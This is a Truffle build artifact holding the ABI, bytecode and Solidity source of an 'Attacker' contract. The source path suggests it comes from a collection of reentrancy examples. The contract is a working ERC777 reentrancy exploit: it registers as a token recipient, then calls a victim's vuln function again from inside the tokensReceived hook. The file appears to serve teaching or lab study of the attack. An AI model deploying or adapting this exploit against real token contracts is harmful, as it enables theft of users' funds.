{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "interfaceHash",
          "type": "bytes32"
        },
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "canImplementInterfaceForAddress",
      "outputs": [
        {
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "registry",
      "outputs": [
        {
          "internalType": "contract IERC1820Registry",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "tokensReceived",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052731820a4b7618bde71dce8cdc73aab6c95905fad24600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550604051610aaf380380610aaf833981810160405281019061007a9190610117565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610192565b6000815190506101118161017b565b92915050565b60006020828403121561012d5761012c610176565b5b600061013b84828501610102565b91505092915050565b600061014f82610156565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61018481610144565b811461018f57600080fd5b50565b61090e806101a16000396000f3fe608060405234801561001057600080fd5b506004361061004b5760003560e01c806223de2914610050578063249cb3fa1461006c57806363d9b7701461009c5780637b103999146100a6575b600080fd5b61006a600480360381019061006591906105d1565b6100c4565b005b610086600480360381019061008191906106a0565b610212565b604051610093919061079b565b60405180910390f35b6100a46102a8565b005b6100ae610495565b6040516100bb91906107b6565b60405180910390f35b6040600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016101219190610749565b602060405180830381600087803b15801561013b57600080fd5b505af115801561014f573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061017391906106e0565b101561020857600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3bb15f060016040518263ffffffff1660e01b81526004016101d591906107d1565b600060405180830381600087803b1580156101ef57600080fd5b505af1158015610203573d6000803e3d6000fd5b505050505b5050505050505050565b600080600084815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1661027e576000801b6102a0565b7fa2ef4600d742022d532d4747cb3547474667d6f13804902513b2ec01c848f4b45b905092915050565b3373ffffffffffffffffffffffffffffffffffffffff16600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461030257600080fd5b6103517fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b60001b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166104bb565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166329965a1d307fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b60001b306040518463ffffffff1660e01b81526004016103d393929190610764565b600060405180830381600087803b1580156103ed57600080fd5b505af1158015610401573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3bb15f060016040518263ffffffff1660e01b815260040161046191906107d1565b600060405180830381600087803b15801561047b57600080fd5b505af115801561048f573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160008084815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505050565b60008135905061053681610893565b92915050565b60008135905061054b816108aa565b92915050565b60008083601f8401126105675761056661087f565b5b8235905067ffffffffffffffff8111156105845761058361087a565b5b6020830191508360018202830111156105a05761059f610884565b5b9250929050565b6000813590506105b6816108c1565b92915050565b6000815190506105cb816108c1565b92915050565b60008060008060008060008060c0898b0312156105f1576105f061088e565b5b60006105ff8b828c01610527565b98505060206106108b828c01610527565b97505060406106218b828c01610527565b96505060606106328b828c016105a7565b955050608089013567ffffffffffffffff81111561065357610652610889565b5b61065f8b828c01610551565b945094505060a089013567ffffffffffffffff81111561068257610681610889565b5b61068e8b828c01610551565b92509250509295985092959890939650565b600080604083850312156106b7576106b661088e565b5b60006106c58582860161053c565b92505060206106d685828601610527565b9150509250929050565b6000602082840312156106f6576106f561088e565b5b6000610704848285016105bc565b91505092915050565b610716816107ec565b82525050565b610725816107fe565b82525050565b61073481610832565b82525050565b61074381610844565b82525050565b600060208201905061075e600083018461070d565b92915050565b6000606082019050610779600083018661070d565b610786602083018561071c565b610793604083018461070d565b949350505050565b60006020820190506107b0600083018461071c565b92915050565b60006020820190506107cb600083018461072b565b92915050565b60006020820190506107e6600083018461073a565b92915050565b60006107f782610808565b9050919050565b6000819050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061083d82610856565b9050919050565b600061084f82610828565b9050919050565b600061086182610868565b9050919050565b600061087382610808565b9050919050565b600080fd5b600080fd5b600080fd5b600080fd5b600080fd5b61089c816107ec565b81146108a757600080fd5b50565b6108b3816107fe565b81146108be57600080fd5b50565b6108ca81610828565b81146108d557600080fd5b5056fea2646970667358221220058bb636a7d5f3268abcdd70f564b2ee4a3bc35c862ff8e7db5f0415faa2eff964736f6c63430008070033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.7;\n\nimport \"@openzeppelin/contracts/token/ERC777/IERC777Sender.sol\";\nimport \"@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol\";\nimport \"@openzeppelin/contracts/interfaces/IERC1820Registry.sol\";\nimport \"@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol\";\ninterface IVictim {\n\tfunction vuln(uint256 amount) external;\n\tfunction balanceOf(address owner) external returns(uint256);\n}\n\ncontract Attacker is ERC1820Implementer {\n\n  bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;\n  IERC1820Registry public registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\n  IVictim private target;\n\taddress private owner;\n\n  constructor(address _target) public payable {\n   target = IVictim(_target);\n   owner = msg.sender;\n  }\n  \n  function exploit() external {\n\t   require(owner == msg.sender);\n     _registerInterfaceForAddress(TOKENS_RECIPIENT_INTERFACE_HASH,address(target));\n     registry.setInterfaceImplementer(\n      address(this),\n      TOKENS_RECIPIENT_INTERFACE_HASH,\n      address(this)\n    );\n    target.vuln(1);\n  }\n  \n  function tokensReceived(\n   address /*operator*/,\n   address from,\n   address /*to*/,\n   uint256 amount,\n   bytes calldata /*userData*/,\n   bytes calldata /*operatorData*/\n  ) external {\n    if(target.balanceOf(address(this)) < 64) {\n  \t\ttarget.vuln(1);\n  \t}\n  }\n\n}\n",
  "sourcePath": "/home/neo/blockfuck/git/all_reentrancy_in_one_repo/erc777_reentrancy/contracts/attacker_contract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.7+commit.e28d00a7.Emscripten.clang"
  },
  "schemaVersion": "3.4.10",
  "updatedAt": "2022-11-07T12:23:26.833Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "canImplementInterfaceForAddress(bytes32,address)": {
        "details": "See {IERC1820Implementer-canImplementInterfaceForAddress}."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}